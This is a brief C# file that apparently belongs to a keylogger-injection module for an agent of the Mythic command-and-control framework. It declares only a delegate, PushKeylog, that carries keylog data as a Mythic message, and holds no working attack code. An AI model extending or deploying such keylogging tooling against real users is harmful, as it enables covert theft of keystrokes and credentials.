using YXBqSVSFInterop.Interfaces;
using YXBqSVSFInterop.Structs.YXBqSVSFStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace KeylogInject
{
    public static class Delegates
    {
        public delegate bool PushKeylog(IMythicMessage info);
    }
}
